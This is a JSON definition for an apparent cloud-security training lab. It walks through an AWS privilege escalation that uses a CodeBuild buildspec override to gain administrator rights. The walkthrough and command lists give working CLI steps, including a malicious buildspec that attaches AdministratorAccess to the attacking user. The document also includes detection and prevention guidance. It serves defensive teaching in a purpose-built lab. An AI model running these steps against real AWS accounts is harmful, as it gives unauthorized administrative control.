{
  "displayName": "CodeBuild Build Start to Admin",
  "name": "codebuild-002-codebuild-startbuild",
  "description": "Exploit existing CodeBuild project with privileged role using buildspec-override",
  "costEstimate": "$0/mo",
  "pathfindingCloudId": "codebuild-002",
  "interactiveDemo": false,
  "category": "Privilege Escalation",
  "subCategory": "existing-passrole",
  "pathType": "one-hop",
  "target": "to-admin",
  "environments": [
    "prod"
  ],
  "attackPath": {
    "principals": [],
    "summary": ""
  },
  "mitreAttack": {
    "tactics": [
      "TA0004 - Privilege Escalation",
      "TA0002 - Execution"
    ],
    "techniques": [
      "T1078.004 - Valid Accounts: Cloud Accounts",
      "T1651 - Cloud Administration Command"
    ]
  },
  "terraform": {
    "variableName": "enable_single_account_privesc_one_hop_to_admin_codebuild_002_codebuild_startbuild",
    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/codebuild-002-codebuild-startbuild"
  },
  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/codebuild-002-codebuild-startbuild",
  "schemaVersion": "4.0.0",
  "permissions": {
    "required": [
      {
        "permission": "codebuild:StartBuild",
        "principal": "pl-prod-codebuild-002-to-admin-starting-user",
        "resource": "*",
        "description": "trigger a build on the existing project with a buildspec override"
      }
    ],
    "helpful": [
      {
        "permission": "codebuild:ListProjects",
        "principal": "pl-prod-codebuild-002-to-admin-starting-user",
        "purpose": "discover existing CodeBuild projects with privileged roles"
      },
      {
        "permission": "codebuild:BatchGetProjects",
        "principal": "pl-prod-codebuild-002-to-admin-starting-user",
        "purpose": "view project details including service role ARN"
      },
      {
        "permission": "codebuild:BatchGetBuilds",
        "principal": "pl-prod-codebuild-002-to-admin-starting-user",
        "purpose": "monitor build execution status and verify success"
      },
      {
        "permission": "iam:ListUsers",
        "principal": "pl-prod-codebuild-002-to-admin-starting-user",
        "purpose": "verify admin access after escalation"
      }
    ]
  },
  "readme": {
    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-codebuild-002-to-admin-starting-user` IAM user to the `pl-prod-codebuild-002-to-admin-project-role` administrative role by triggering a build on the existing `pl-prod-codebuild-002-to-admin-existing-project` CodeBuild project with a malicious `--buildspec-override` that attaches `AdministratorAccess` to the starting user.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-codebuild-002-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-codebuild-002-to-admin-project-role`",
    "setup": {
      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
      "deployNonInteractive": "```bash\nplabs enable enable_single_account_privesc_one_hop_to_admin_codebuild_002_codebuild_startbuild\nplabs apply\n```",
      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy"
    },
    "attack": {
      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-codebuild-002-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:codebuild:{region}:{account_id}:project/pl-prod-codebuild-002-to-admin-existing-project` | Pre-existing CodeBuild project with privileged role |\n| `arn:aws:iam::{account_id}:role/pl-prod-codebuild-002-to-admin-project-role` | Privileged role with AdministratorAccess attached to CodeBuild project |\n| `arn:aws:iam::{account_id}:policy/pl-prod-codebuild-002-to-admin-user-policy` | Policy granting codebuild:StartBuild, codebuild:ListProjects, codebuild:BatchGetProjects, and codebuild:BatchGetBuilds |",
      "demoAttack": {
        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Verify successful privilege escalation\n4. Output standardized test results for automation",
        "resourcesCreated": "- `AdministratorAccess` managed policy attached to `pl-prod-codebuild-002-to-admin-starting-user`",
        "nonInteractive": "```bash\nplabs demo --list\nplabs demo codebuild-002-codebuild-startbuild\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
      },
      "cleanup": {
        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup codebuild-002-codebuild-startbuild\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
      }
    },
    "teardown": {
      "nonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_codebuild_002_codebuild_startbuild\nplabs apply\n```",
      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
    },
    "defend": {
      "cspm": {
        "whatToDetect": "- **Overly Permissive CodeBuild Access**: Users/roles with broad `codebuild:StartBuild` permissions on projects with privileged roles\n- **Privileged CodeBuild Service Roles**: CodeBuild projects with administrative or sensitive IAM permissions\n- **Buildspec Override Risk**: Projects that allow buildspec overrides combined with privileged service roles\n- **Privilege Escalation Path**: Automated detection of the complete attack chain from user to admin via CodeBuild\n- **Missing Project Constraints**: `codebuild:StartBuild` permissions without resource-based restrictions to specific projects\n- **Dangerous Service Role Combinations**: CodeBuild roles with IAM modification permissions (AttachUserPolicy, PutUserPolicy, etc.)",
        "prevention": "- **Restrict codebuild:StartBuild**: Limit `codebuild:StartBuild` to specific projects using resource-based conditions: `\"Resource\": \"arn:aws:codebuild:*:*:project/specific-safe-project\"`\n- **Least Privilege Service Roles**: Ensure CodeBuild service roles follow least privilege and cannot modify IAM permissions\n- **Disable Buildspec Override**: Set project configuration to disallow buildspec overrides for projects with privileged roles\n- **CloudTrail Monitoring**: Alert on `StartBuild` API calls with buildspec overrides on privileged projects, and monitor `AttachUserPolicy`/`PutUserPolicy` calls from CodeBuild service principals\n- **Service Control Policies**: Implement SCPs to prevent CodeBuild service roles from modifying IAM policies: `Deny iam:AttachUserPolicy, iam:PutUserPolicy, iam:AttachRolePolicy, iam:PutRolePolicy when aws:PrincipalServiceName = codebuild.amazonaws.com`\n- **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild projects\n- **Project Review Process**: Regularly audit CodeBuild projects to identify those with privileged service roles and restrict access accordingly\n- **Separation of Concerns**: Avoid attaching administrative roles to CodeBuild projects; use least-privilege roles specific to build requirements"
      },
      "cloudSiem": {
        "cloudTrailEvents": "- `CodeBuild: StartBuild` -- Build triggered with buildspec override; critical when targeting projects with privileged service roles\n- `IAM: AttachUserPolicy` -- Managed policy attached to a user; high severity when AdministratorAccess is attached from a CodeBuild service principal",
        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
      }
    },
    "guidedWalkthrough": "# Guided Walkthrough: Privilege Escalation via codebuild:StartBuild on Existing Project\n\nThis scenario demonstrates a privilege escalation vulnerability where a user with only `codebuild:StartBuild` permission can exploit an existing CodeBuild project that has a privileged service role attached. Unlike the PassRole+CreateProject attack (codebuild-001), this path does NOT require `iam:PassRole` or `codebuild:CreateProject` permissions, making it a more subtle and often overlooked escalation route.\n\nThe key to this attack is the `--buildspec-override` parameter in the `codebuild:StartBuild` API. This parameter allows an attacker to replace the project's default buildspec with arbitrary commands, even without permission to modify the project itself. When an existing project has an administrative or highly privileged role attached, the attacker can execute AWS CLI commands with those elevated permissions simply by triggering a build.\n\nThis vulnerability commonly appears in environments where developers are granted broad `codebuild:StartBuild` permissions for CI/CD workflows, but the organization hasn't considered that existing projects might have privileged roles that could be exploited through buildspec overrides.\n\n## The Challenge\n\nYou start with credentials for `pl-prod-codebuild-002-to-admin-starting-user`. This IAM user has `codebuild:StartBuild` permission (along with helpful recon permissions `codebuild:ListProjects`, `codebuild:BatchGetProjects`, and `codebuild:BatchGetBuilds`), but notably does NOT have `iam:PassRole` or `codebuild:CreateProject`.\n\nYour goal is to reach `AdministratorAccess` by exploiting the pre-existing `pl-prod-codebuild-002-to-admin-existing-project` CodeBuild project, which has the `pl-prod-codebuild-002-to-admin-project-role` (AdministratorAccess) attached as its service role.\n\nConfigure your terminal with the starting user credentials from Terraform output:\n\n```bash\ncd <pathfinding-labs-root>\nMODULE_OUTPUT=$(terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_codebuild_002_codebuild_startbuild.value')\nexport AWS_ACCESS_KEY_ID=$(echo \"$MODULE_OUTPUT\" | jq -r '.starting_user_access_key_id')\nexport AWS_SECRET_ACCESS_KEY=$(echo \"$MODULE_OUTPUT\" | jq -r '.starting_user_secret_access_key')\nunset AWS_SESSION_TOKEN\n```\n\n## Reconnaissance\n\nFirst, confirm who you are and verify you lack admin permissions:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::<account_id>:user/pl-prod-codebuild-002-to-admin-starting-user\n\naws iam list-users --max-items 1\n# AccessDenied \u2014 no admin permissions yet, as expected\n```\n\nNow look for CodeBuild projects in the account. Since you have `codebuild:ListProjects`, you can enumerate them directly:\n\n```bash\naws codebuild list-projects --query 'projects[*]' --output json\n```\n\nYou should see `pl-prod-codebuild-002-to-admin-existing-project` in the list. Use `codebuild:BatchGetProjects` to inspect it and find the attached service role:\n\n```bash\naws codebuild batch-get-projects \\\n  --names pl-prod-codebuild-002-to-admin-existing-project \\\n  --query 'projects[0].serviceRole'\n# \"arn:aws:iam::<account_id>:role/pl-prod-codebuild-002-to-admin-project-role\"\n```\n\nThe project's service role is `pl-prod-codebuild-002-to-admin-project-role`. A role with this name is almost certainly privileged \u2014 it was created specifically for this scenario with `AdministratorAccess` attached. Any build running under this project executes with those admin permissions.\n\n## Exploitation\n\nThe `codebuild:StartBuild` API accepts a `--buildspec-override` parameter that completely replaces the project's configured buildspec for that specific build run. You don't need to modify the project \u2014 you just supply different instructions at build-trigger time.\n\nCraft a buildspec that attaches `AdministratorAccess` to your starting user, then fire the build:\n\n```bash\nMALICIOUS_BUILDSPEC=$(cat <<'EOF'\nversion: 0.2\nphases:\n  build:\n    commands:\n      - echo \"Starting privilege escalation via buildspec override...\"\n      - aws iam attach-user-policy --user-name pl-prod-codebuild-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n      - echo \"Successfully attached AdministratorAccess policy\"\nEOF\n)\n\nBUILD_RESULT=$(aws codebuild start-build \\\n  --project-name pl-prod-codebuild-002-to-admin-existing-project \\\n  --buildspec-override \"$MALICIOUS_BUILDSPEC\" \\\n  --output json)\n\nBUILD_ID=$(echo \"$BUILD_RESULT\" | jq -r '.build.id')\necho \"Build ID: $BUILD_ID\"\n```\n\nThe build will take 30-60 seconds to provision, execute, and complete. Poll its status:\n\n```bash\naws codebuild batch-get-builds \\\n  --ids \"$BUILD_ID\" \\\n  --query 'builds[0].buildStatus' \\\n  --output text\n# IN_PROGRESS ... then SUCCEEDED\n```\n\nOnce the build status is `SUCCEEDED`, wait an additional 15 seconds for IAM policy propagation:\n\n```bash\nsleep 15\n```\n\n## Verification\n\nNow confirm you have administrator access with your original starting user credentials:\n\n```bash\naws iam list-users --max-items 3 --output table\n```\n\nIf the table returns successfully, the `AdministratorAccess` managed policy has been attached to your user. The privilege escalation is complete.\n\n## What Happened\n\nYou exploited two compounding weaknesses: a CodeBuild project with an overly-permissive service role (`AdministratorAccess`) and a user with broad `codebuild:StartBuild` permission that was not scoped to specific projects. The `--buildspec-override` parameter \u2014 designed to let CI/CD pipelines customize build instructions per-invocation \u2014 became the attack vector.\n\nIn a real environment this path appears whenever developers have project-wide `codebuild:StartBuild` access for convenience. Because the permission looks innocuous on its own (it just \"starts builds\"), security reviews often miss the amplification that occurs when an existing project runs under a privileged role. The fix requires either scoping `codebuild:StartBuild` to non-privileged projects by ARN, or ensuring that no CodeBuild project runs with a service role that can modify IAM.\n"
  },
  "attackMap": {
    "nodes": [
      {
        "id": "starting-principal",
        "label": "Starting User",
        "type": "principal",
        "subType": "iam-user",
        "arn": "arn:aws:iam::{account_id}:user/pl-prod-codebuild-002-to-admin-starting-user",
        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has codebuild:StartBuild permission (along with helpful permissions codebuild:ListProjects, codebuild:BatchGetProjects, and codebuild:BatchGetBuilds), but notably does NOT have iam:PassRole or codebuild:CreateProject. Look for existing CodeBuild projects that have privileged service roles attached.\n"
      },
      {
        "id": "codebuild-project",
        "label": "Existing CodeBuild Project",
        "type": "resource",
        "subType": "codebuild-project",
        "arn": "arn:aws:codebuild:{region}:{account_id}:project/pl-prod-codebuild-002-to-admin-existing-project",
        "description": "This pre-existing CodeBuild project has a privileged service role attached. By starting a build with a buildspec override, you can execute arbitrary commands under the project's service role without needing iam:PassRole or codebuild:CreateProject permissions.\n"
      },
      {
        "id": "project-role",
        "label": "Privileged Project Role",
        "type": "principal",
        "subType": "iam-role",
        "isTarget": true,
        "arn": "arn:aws:iam::{account_id}:role/pl-prod-codebuild-002-to-admin-project-role",
        "description": "This IAM role is attached to the CodeBuild project as its service role. It has AdministratorAccess, meaning any build running under this project can perform any AWS action \u2014 including attaching managed policies to IAM users. The malicious buildspec executes under this role's permissions, attaching AdministratorAccess directly to the starting user and completing the privilege escalation.\n"
      }
    ],
    "edges": [
      {
        "from": "starting-principal",
        "to": "codebuild-project",
        "label": "codebuild:StartBuild",
        "description": "Trigger a build on the existing project using --buildspec-override to supply a malicious buildspec that attaches AdministratorAccess to the starting user.\n",
        "hints": [
          "Use codebuild:ListProjects to enumerate all CodeBuild projects in the account \u2014 look for any that sound privileged or prod-facing.",
          "Once you have a project name, use codebuild:BatchGetProjects to inspect its details, particularly the serviceRole field.",
          "A project whose service role name contains 'admin' or 'prod' is worth investigating \u2014 find out what policies that role has.",
          "The codebuild:StartBuild API accepts a --buildspec-override parameter that completely replaces the project's build instructions for that single run \u2014 without modifying the project itself.",
          "Your buildspec override only needs to run a single AWS CLI command using the project role's permissions.",
          "Browse to https://pathfinding.cloud/paths/codebuild-002 for technique details."
        ],
        "commands": [
          {
            "description": "List existing CodeBuild projects",
            "command": "aws codebuild list-projects"
          },
          {
            "description": "Inspect the project's service role",
            "command": "aws codebuild batch-get-projects --names pl-prod-codebuild-002-to-admin-existing-project --query 'projects[0].serviceRole'"
          },
          {
            "description": "Start a build with a malicious buildspec override",
            "command": "aws codebuild start-build \\\n  --project-name pl-prod-codebuild-002-to-admin-existing-project \\\n  --buildspec-override 'version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws iam attach-user-policy --user-name pl-prod-codebuild-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'\n"
          },
          {
            "description": "Wait for the build to complete",
            "command": "aws codebuild batch-get-builds --ids <build-id> --query 'builds[0].buildStatus'"
          }
        ]
      },
      {
        "from": "codebuild-project",
        "to": "project-role",
        "label": "iam:AttachUserPolicy",
        "description": "The CodeBuild project executes the override buildspec using its attached service role. The malicious buildspec uses the project role's IAM permissions to attach AdministratorAccess directly to the starting user, completing the escalation.\n",
        "hints": [
          "The build runs under the project's service role \u2014 any AWS CLI command in your buildspec executes with that role's permissions.",
          "After the build status reaches SUCCEEDED, wait 15 seconds for IAM policy propagation before testing your new permissions.",
          "Verify the escalation succeeded by running an IAM operation that would have been denied before \u2014 such as listing IAM users."
        ],
        "commands": [
          {
            "description": "Verify administrator access with original credentials",
            "command": "aws iam list-users --max-items 1"
          }
        ]
      }
    ]
  },
  "hasAttackMap": true,
  "slug": "codebuild-002"
}